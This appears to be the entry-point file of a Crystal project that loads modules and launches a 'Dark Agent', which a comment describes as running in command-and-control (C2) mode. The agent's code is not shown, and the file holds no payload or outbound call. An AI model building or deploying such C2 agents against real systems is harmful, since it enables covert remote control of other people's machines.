require "./elf/*"
require "./agent/*"
require "./common/*"

# Initialize Dark Agent (C2 mode by default)
log_debug("Starting Dark Agent...")
agent = Dark::Agent::Base.new
agent.run